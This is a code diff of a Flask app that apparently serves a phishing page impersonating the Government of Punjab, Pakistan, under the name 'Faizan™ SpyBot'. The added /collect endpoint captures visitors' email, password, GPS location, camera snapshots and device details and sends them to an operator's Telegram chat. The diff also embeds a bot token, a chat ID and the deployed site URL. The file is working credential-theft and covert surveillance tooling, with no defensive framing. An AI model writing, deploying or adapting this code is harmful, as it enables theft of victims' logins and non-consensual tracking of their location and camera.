@@ -1,55 +1,86 @@
-from flask import Flask, render_template, request
-import requests
+from flask import Flask, request, render_template
+import requests, base64, os
 
 app = Flask(__name__)
 
-# Telegram credentials
-OT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
+# Telegram Configurations
+BOT_TOKEN = '7816397892:AAF6GslyJpBOv-ax4t5FdR-NOSOjESW1jMg'
 CHAT_ID = '6908281054'
+YOUR_SITE_LINK = "https://govt-of-punjab-pak.onrender.com"
 
-# Your phishing or tracking page link
-LINK = 'https://govt-of-punjab-pak.onrender.com'
+# Welcome message for /start
+def send_welcome():
+    welcome_text = f"""👋 *Welcome to Faizan™ SpyBot!*
+
+⚠️ *Government of Pakistan – Cyber Intelligence*
+
+🔗 [Live Monitoring Portal]({YOUR_SITE_LINK})
+
+This system is confidential. Your location, device, and camera are under analysis."""
+    requests.post(
+        f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+        json={
+            "chat_id": CHAT_ID,
+            "text": welcome_text,
+            "parse_mode": "Markdown",
+            "disable_web_page_preview": False
+        }
+    )
 
 @app.route('/')
 def index():
-    return render_template('spy.html')
+    send_welcome()
+    return render_template("spy.html")
 
 @app.route('/collect', methods=['POST'])
 def collect():
-    try:
-        data = request.get_json()
-        message = f"""🕵️‍♂️ *SpyBot Alert*
-📍 *Location:* {data.get('latitude', '❌ Unknown')}, {data.get('longitude', '❌')}
-📷 *Camera:* {data.get('camera')}
-🧠 *Device:* {data.get('device')}
-🌐 *UserAgent:* `{data.get('userAgent')}`"""
-        requests.post(f'https://api.telegram.org/bot{OT_TOKEN}/sendMessage', data={
-            'chat_id': CHAT_ID,
-            'text': message,
-            'parse_mode': 'Markdown'
-        })
-    except Exception as e:
-        print(f"[ERROR] {e}")
-    return "✅ Info Received"
-
-# Telegram bot webhook (responds to /start)
-@app.route(f'/bot-{OT_TOKEN.split(":")[0]}', methods=['POST'])
-def webhook():
     data = request.get_json()
-    if 'message' in data:
-        msg = data['message']
-        if msg.get('text') == '/start':
-            reply = f"""👋 *Welcome to Faizan™ SpyBot*
-📡 System is active. Your tracking link:https://govt-of-punjab-pak.onrender.com
+    email = data.get("email", "❌ Not Provided")
+    password = data.get("password", "❌ Not Provided")
+    user_agent = data.get("userAgent")
+    latitude = data.get("latitude")
+    longitude = data.get("longitude")
+    camera = data.get("camera")
+    device_info = data.get("deviceInfo")
+    image_data = data.get("image")
 
-🔗 {LINK}
+    location_text = f"📍 Location: {latitude}, {longitude}" if latitude and longitude else "❌ Location Blocked"
+    map_link = f"\n📌 [View on Map](https://maps.google.com/?q={latitude},{longitude})" if latitude and longitude else ""
+    message = f"""
+🕵️‍♂️ *Faizan™ SpyBot Alert*
+📧 Email: `{email}`
+🔑 Password: `{password}`
+{location_text}{map_link}
+📷 Camera: {camera}
+🧠 Device: {device_info}
+🌐 UserAgent: `{user_agent}`
 """
-            requests.post(f'https://api.telegram.org/bot{OT_TOKEN}/sendMessage', data={
-                'chat_id': msg['chat']['id'],
-                'text': reply,
-                'parse_mode': 'Markdown'
-            })
-    return "ok"
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    send_to_telegram(message)
+
+    if image_data:
+        send_photo(image_data)
+
+    return "✅ Data Collected"
+
+def send_to_telegram(text):
+    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": CHAT_ID,
+        "text": text,
+        "parse_mode": "Markdown"
+    }
+    requests.post(url, json=payload)
+
+def send_photo(base64_image):
+    try:
+        img_bytes = base64.b64decode(base64_image.split(',')[1])
+        files = {'photo': ('snapshot.jpg', img_bytes)}
+        data = {'chat_id': CHAT_ID}
+        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", files=files, data=data)
+    except Exception as e:
+        print("❌ Camera Photo Error:", e)
+
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
